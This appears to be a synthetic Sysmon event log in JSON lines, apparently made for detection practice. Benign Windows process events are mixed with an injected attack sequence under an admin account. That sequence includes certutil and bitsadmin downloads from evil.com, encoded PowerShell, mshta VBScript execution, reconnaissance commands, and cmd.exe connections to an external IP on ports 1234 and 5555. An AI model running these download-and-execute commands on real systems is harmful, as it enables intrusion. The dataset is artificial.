{"EventID": 1, "UtcTime": "2026-03-26 14:10:56.000", "ProcessId": 7828, "Image": "C:\\Program Files\\Python310\\python.exe", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "C:\\Program Files\\Python310\\python.exe app.py", "User": "DESKTOP-LAB\\user01", "SourceIp": "10.0.1.52", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 13:42:59.000", "ProcessId": 5568, "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe --type=renderer", "User": "DESKTOP-LAB\\user01", "SourceIp": "10.0.1.51", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 13:45:29.000", "ProcessId": 2087, "Image": "C:\\Windows\\System32\\svchost.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs", "User": "DESKTOP-LAB\\user01", "SourceIp": "10.0.1.51", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 09:51:33.000", "ProcessId": 4210, "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe --type=renderer", "User": "DESKTOP-LAB\\user01", "SourceIp": "10.0.1.50", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 11:45:53.000", "ProcessId": 9799, "Image": "C:\\Windows\\System32\\conhost.exe", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "C:\\Windows\\System32\\conhost.exe 0xffffffff -ForceV1", "User": "DESKTOP-LAB\\user01", "SourceIp": "10.0.1.51", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 14:00:20.000", "ProcessId": 6079, "Image": "C:\\Windows\\System32\\svchost.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs", "User": "DESKTOP-LAB\\user01", "SourceIp": "10.0.1.52", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 13:58:47.000", "ProcessId": 6741, "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe --type=renderer", "User": "DESKTOP-LAB\\user01", "SourceIp": "10.0.1.54", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 14:50:33.000", "ProcessId": 1476, "Image": "C:\\Windows\\System32\\notepad.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "C:\\Windows\\System32\\notepad.exe document.txt", "User": "DESKTOP-LAB\\user01", "SourceIp": "10.0.1.54", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 12:10:33.000", "ProcessId": 4481, "Image": "C:\\Windows\\System32\\notepad.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "C:\\Windows\\System32\\notepad.exe document.txt", "User": "DESKTOP-LAB\\user01", "SourceIp": "10.0.1.52", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 13:52:50.000", "ProcessId": 4023, "Image": "C:\\Windows\\System32\\conhost.exe", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "C:\\Windows\\System32\\conhost.exe 0xffffffff -ForceV1", "User": "DESKTOP-LAB\\user01", "SourceIp": "10.0.1.52", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 14:20:26.000", "ProcessId": 5213, "Image": "C:\\Program Files\\Python310\\python.exe", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "C:\\Program Files\\Python310\\python.exe app.py", "User": "DESKTOP-LAB\\user01", "SourceIp": "10.0.1.53", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 13:35:47.000", "ProcessId": 2621, "Image": "C:\\Windows\\System32\\notepad.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "C:\\Windows\\System32\\notepad.exe document.txt", "User": "DESKTOP-LAB\\user01", "SourceIp": "10.0.1.52", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 13:40:53.000", "ProcessId": 4296, "Image": "C:\\Windows\\System32\\notepad.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "C:\\Windows\\System32\\notepad.exe document.txt", "User": "DESKTOP-LAB\\user01", "SourceIp": "10.0.1.53", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 13:54:38.000", "ProcessId": 2786, "Image": "C:\\Windows\\System32\\conhost.exe", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "C:\\Windows\\System32\\conhost.exe 0xffffffff -ForceV1", "User": "DESKTOP-LAB\\user01", "SourceIp": "10.0.1.53", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 14:31:28.000", "ProcessId": 1638, "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe --type=renderer", "User": "DESKTOP-LAB\\user01", "SourceIp": "10.0.1.51", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 14:30:01.000", "ProcessId": 7387, "Image": "C:\\Windows\\System32\\svchost.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs", "User": "DESKTOP-LAB\\user01", "SourceIp": "10.0.1.52", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 14:55:29.000", "ProcessId": 8395, "Image": "C:\\Windows\\System32\\svchost.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs", "User": "DESKTOP-LAB\\user01", "SourceIp": "10.0.1.52", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 10:05:17.000", "ProcessId": 4490, "Image": "C:\\Windows\\System32\\svchost.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs", "User": "DESKTOP-LAB\\user01", "SourceIp": "10.0.1.51", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 11:35:51.000", "ProcessId": 5157, "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe --type=renderer", "User": "DESKTOP-LAB\\user01", "SourceIp": "10.0.1.54", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 13:41:56.000", "ProcessId": 6242, "Image": "C:\\Windows\\System32\\conhost.exe", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "C:\\Windows\\System32\\conhost.exe 0xffffffff -ForceV1", "User": "DESKTOP-LAB\\user01", "SourceIp": "10.0.1.50", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 14:10:55.000", "ProcessId": 8129, "Image": "C:\\Windows\\System32\\notepad.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "C:\\Windows\\System32\\notepad.exe document.txt", "User": "DESKTOP-LAB\\user01", "SourceIp": "10.0.1.55", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 10:32:09.000", "ProcessId": 4793, "Image": "C:\\Windows\\System32\\svchost.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs", "User": "DESKTOP-LAB\\user01", "SourceIp": "10.0.1.52", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 10:45:00.000", "ProcessId": 5517, "Image": "C:\\Program Files\\Python310\\python.exe", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "C:\\Program Files\\Python310\\python.exe app.py", "User": "DESKTOP-LAB\\user01", "SourceIp": "10.0.1.53", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 12:52:01.000", "ProcessId": 9024, "Image": "C:\\Program Files\\Python310\\python.exe", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "C:\\Program Files\\Python310\\python.exe app.py", "User": "DESKTOP-LAB\\user01", "SourceIp": "10.0.1.52", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 12:13:27.000", "ProcessId": 8816, "Image": "C:\\Windows\\System32\\notepad.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "C:\\Windows\\System32\\notepad.exe document.txt", "User": "DESKTOP-LAB\\user01", "SourceIp": "10.0.1.50", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 13:44:39.000", "ProcessId": 8272, "Image": "C:\\Windows\\System32\\conhost.exe", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "C:\\Windows\\System32\\conhost.exe 0xffffffff -ForceV1", "User": "DESKTOP-LAB\\user01", "SourceIp": "10.0.1.54", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 09:42:13.000", "ProcessId": 5902, "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe --type=renderer", "User": "DESKTOP-LAB\\user01", "SourceIp": "10.0.1.52", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 13:37:13.000", "ProcessId": 4915, "Image": "C:\\Windows\\System32\\svchost.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs", "User": "DESKTOP-LAB\\user01", "SourceIp": "10.0.1.51", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 11:46:10.000", "ProcessId": 5154, "Image": "C:\\Program Files\\Python310\\python.exe", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "C:\\Program Files\\Python310\\python.exe app.py", "User": "DESKTOP-LAB\\user01", "SourceIp": "10.0.1.53", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 09:19:40.000", "ProcessId": 8831, "Image": "C:\\Windows\\System32\\notepad.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "C:\\Windows\\System32\\notepad.exe document.txt", "User": "DESKTOP-LAB\\user01", "SourceIp": "10.0.1.51", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 12:48:00.000", "ProcessId": 2155, "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe --type=renderer", "User": "DESKTOP-LAB\\user01", "SourceIp": "10.0.1.55", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 10:19:12.000", "ProcessId": 4657, "Image": "C:\\Windows\\System32\\svchost.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs", "User": "DESKTOP-LAB\\user01", "SourceIp": "10.0.1.53", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 14:10:17.000", "ProcessId": 1436, "Image": "C:\\Windows\\System32\\notepad.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "C:\\Windows\\System32\\notepad.exe document.txt", "User": "DESKTOP-LAB\\user01", "SourceIp": "10.0.1.54", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 11:49:03.000", "ProcessId": 1540, "Image": "C:\\Program Files\\Python310\\python.exe", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "C:\\Program Files\\Python310\\python.exe app.py", "User": "DESKTOP-LAB\\user01", "SourceIp": "10.0.1.51", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 12:44:55.000", "ProcessId": 1225, "Image": "C:\\Windows\\System32\\svchost.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs", "User": "DESKTOP-LAB\\user01", "SourceIp": "10.0.1.55", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 14:39:16.000", "ProcessId": 8124, "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe --type=renderer", "User": "DESKTOP-LAB\\user01", "SourceIp": "10.0.1.50", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 13:00:38.000", "ProcessId": 4640, "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe --type=renderer", "User": "DESKTOP-LAB\\user01", "SourceIp": "10.0.1.54", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 10:26:41.000", "ProcessId": 9823, "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe --type=renderer", "User": "DESKTOP-LAB\\user01", "SourceIp": "10.0.1.50", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 09:09:55.000", "ProcessId": 6190, "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe --type=renderer", "User": "DESKTOP-LAB\\user01", "SourceIp": "10.0.1.52", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 10:16:01.000", "ProcessId": 2686, "Image": "C:\\Program Files\\Python310\\python.exe", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "C:\\Program Files\\Python310\\python.exe app.py", "User": "DESKTOP-LAB\\user01", "SourceIp": "10.0.1.51", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 09:07:19.000", "ProcessId": 6816, "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe --type=renderer", "User": "DESKTOP-LAB\\user01", "SourceIp": "10.0.1.54", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 13:06:18.000", "ProcessId": 6439, "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe --type=renderer", "User": "DESKTOP-LAB\\user01", "SourceIp": "10.0.1.55", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 14:20:50.000", "ProcessId": 4389, "Image": "C:\\Program Files\\Python310\\python.exe", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "C:\\Program Files\\Python310\\python.exe app.py", "User": "DESKTOP-LAB\\user01", "SourceIp": "10.0.1.52", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 13:49:31.000", "ProcessId": 8015, "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe --type=renderer", "User": "DESKTOP-LAB\\user01", "SourceIp": "10.0.1.51", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 13:31:06.000", "ProcessId": 9478, "Image": "C:\\Windows\\System32\\svchost.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs", "User": "DESKTOP-LAB\\user01", "SourceIp": "10.0.1.55", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 14:20:43.000", "ProcessId": 2323, "Image": "C:\\Windows\\System32\\notepad.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "C:\\Windows\\System32\\notepad.exe document.txt", "User": "DESKTOP-LAB\\user01", "SourceIp": "10.0.1.50", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 09:33:04.000", "ProcessId": 3966, "Image": "C:\\Windows\\System32\\conhost.exe", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "C:\\Windows\\System32\\conhost.exe 0xffffffff -ForceV1", "User": "DESKTOP-LAB\\user01", "SourceIp": "10.0.1.51", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 12:58:44.000", "ProcessId": 9397, "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe --type=renderer", "User": "DESKTOP-LAB\\user01", "SourceIp": "10.0.1.54", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 09:50:20.000", "ProcessId": 4590, "Image": "C:\\Windows\\System32\\svchost.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs", "User": "DESKTOP-LAB\\user01", "SourceIp": "10.0.1.53", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 11:18:07.000", "ProcessId": 8960, "Image": "C:\\Windows\\System32\\notepad.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "C:\\Windows\\System32\\notepad.exe document.txt", "User": "DESKTOP-LAB\\user01", "SourceIp": "10.0.1.50", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 10:52:43.000", "ProcessId": 2580, "Image": "C:\\Windows\\System32\\notepad.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "C:\\Windows\\System32\\notepad.exe document.txt", "User": "DESKTOP-LAB\\user01", "SourceIp": "10.0.1.52", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 12:56:20.000", "ProcessId": 1308, "Image": "C:\\Windows\\System32\\svchost.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs", "User": "DESKTOP-LAB\\user01", "SourceIp": "10.0.1.50", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 12:54:57.000", "ProcessId": 3916, "Image": "C:\\Windows\\System32\\conhost.exe", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "C:\\Windows\\System32\\conhost.exe 0xffffffff -ForceV1", "User": "DESKTOP-LAB\\user01", "SourceIp": "10.0.1.54", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 12:26:50.000", "ProcessId": 9558, "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe --type=renderer", "User": "DESKTOP-LAB\\user01", "SourceIp": "10.0.1.54", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 11:56:25.000", "ProcessId": 2075, "Image": "C:\\Windows\\System32\\conhost.exe", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "C:\\Windows\\System32\\conhost.exe 0xffffffff -ForceV1", "User": "DESKTOP-LAB\\user01", "SourceIp": "10.0.1.53", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 12:47:56.000", "ProcessId": 4909, "Image": "C:\\Windows\\System32\\notepad.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "C:\\Windows\\System32\\notepad.exe document.txt", "User": "DESKTOP-LAB\\user01", "SourceIp": "10.0.1.55", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 12:42:00.000", "ProcessId": 7650, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "powershell.exe -enc SQBFAFgA", "User": "DESKTOP-LAB\\admin", "SourceIp": "10.0.1.50", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 12:13:00.000", "ProcessId": 7050, "Image": "C:\\Windows\\System32\\cmd.exe", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c net user", "User": "DESKTOP-LAB\\admin", "SourceIp": "10.0.1.50", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 12:32:00.000", "ProcessId": 8097, "Image": "C:\\Windows\\System32\\mshta.exe", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "mshta.exe vbscript:Execute(\"CreateObject(...)\")", "User": "DESKTOP-LAB\\admin", "SourceIp": "10.0.1.50", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 12:51:00.000", "ProcessId": 6130, "Image": "C:\\Windows\\System32\\certutil.exe", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "certutil.exe -urlcache -split -f http://evil.com/payload.exe", "User": "DESKTOP-LAB\\admin", "SourceIp": "10.0.1.50", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 12:32:00.000", "ProcessId": 8017, "Image": "C:\\Windows\\System32\\certutil.exe", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "certutil.exe -urlcache -split -f http://evil.com/payload.exe", "User": "DESKTOP-LAB\\admin", "SourceIp": "10.0.1.50", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 12:41:00.000", "ProcessId": 6961, "Image": "C:\\Windows\\System32\\bitsadmin.exe", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "bitsadmin /transfer /download http://evil.com/mal.exe", "User": "DESKTOP-LAB\\admin", "SourceIp": "10.0.1.50", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 12:52:00.000", "ProcessId": 5577, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "powershell.exe -enc SQBFAFgA", "User": "DESKTOP-LAB\\admin", "SourceIp": "10.0.1.50", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 12:45:00.000", "ProcessId": 5558, "Image": "C:\\Windows\\System32\\bitsadmin.exe", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "bitsadmin /transfer /download http://evil.com/mal.exe", "User": "DESKTOP-LAB\\admin", "SourceIp": "10.0.1.50", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 12:04:00.000", "ProcessId": 9054, "Image": "C:\\Windows\\System32\\cmd.exe", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c whoami", "User": "DESKTOP-LAB\\admin", "SourceIp": "10.0.1.50", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 12:29:00.000", "ProcessId": 8864, "Image": "C:\\Windows\\System32\\cmd.exe", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c whoami", "User": "DESKTOP-LAB\\admin", "SourceIp": "10.0.1.50", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 12:07:00.000", "ProcessId": 5831, "Image": "C:\\Windows\\System32\\cmd.exe", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c whoami", "User": "DESKTOP-LAB\\admin", "SourceIp": "10.0.1.50", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 12:00:00.000", "ProcessId": 7083, "Image": "C:\\Windows\\System32\\bitsadmin.exe", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "bitsadmin /transfer /download http://evil.com/mal.exe", "User": "DESKTOP-LAB\\admin", "SourceIp": "10.0.1.50", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 12:20:00.000", "ProcessId": 8268, "Image": "C:\\Windows\\System32\\mshta.exe", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "mshta.exe vbscript:Execute(\"CreateObject(...)\")", "User": "DESKTOP-LAB\\admin", "SourceIp": "10.0.1.50", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 12:10:00.000", "ProcessId": 6663, "Image": "C:\\Windows\\System32\\bitsadmin.exe", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "bitsadmin /transfer /download http://evil.com/mal.exe", "User": "DESKTOP-LAB\\admin", "SourceIp": "10.0.1.50", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 12:26:00.000", "ProcessId": 5429, "Image": "C:\\Windows\\System32\\bitsadmin.exe", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "bitsadmin /transfer /download http://evil.com/mal.exe", "User": "DESKTOP-LAB\\admin", "SourceIp": "10.0.1.50", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 12:41:00.000", "ProcessId": 9347, "Image": "C:\\Windows\\System32\\cmd.exe", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c ipconfig /all", "User": "DESKTOP-LAB\\admin", "SourceIp": "10.0.1.50", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 12:48:00.000", "ProcessId": 6271, "Image": "C:\\Windows\\System32\\mshta.exe", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "mshta.exe vbscript:Execute(\"CreateObject(...)\")", "User": "DESKTOP-LAB\\admin", "SourceIp": "10.0.1.50", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 12:06:00.000", "ProcessId": 9406, "Image": "C:\\Windows\\System32\\cmd.exe", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c whoami", "User": "DESKTOP-LAB\\admin", "SourceIp": "10.0.1.50", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 13:00:00.000", "ProcessId": 5757, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "powershell.exe -enc SQBFAFgA", "User": "DESKTOP-LAB\\admin", "SourceIp": "10.0.1.50", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 1, "UtcTime": "2026-03-26 12:42:00.000", "ProcessId": 5779, "Image": "C:\\Windows\\System32\\cmd.exe", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c net user", "User": "DESKTOP-LAB\\admin", "SourceIp": "10.0.1.50", "DestinationIp": "", "DestinationPort": 0}
{"EventID": 3, "UtcTime": "2026-03-26 13:19:00.000", "ProcessId": 6796, "Image": "C:\\Windows\\System32\\cmd.exe", "ParentImage": "", "CommandLine": "", "User": "DESKTOP-LAB\\admin", "SourceIp": "10.0.1.50", "DestinationIp": "185.220.101.33", "DestinationPort": 1234}
{"EventID": 3, "UtcTime": "2026-03-26 13:24:00.000", "ProcessId": 6802, "Image": "C:\\Windows\\System32\\cmd.exe", "ParentImage": "", "CommandLine": "", "User": "DESKTOP-LAB\\admin", "SourceIp": "10.0.1.50", "DestinationIp": "185.220.101.33", "DestinationPort": 1234}
{"EventID": 3, "UtcTime": "2026-03-26 13:13:00.000", "ProcessId": 5907, "Image": "C:\\Windows\\System32\\cmd.exe", "ParentImage": "", "CommandLine": "", "User": "DESKTOP-LAB\\admin", "SourceIp": "10.0.1.50", "DestinationIp": "185.220.101.33", "DestinationPort": 5555}
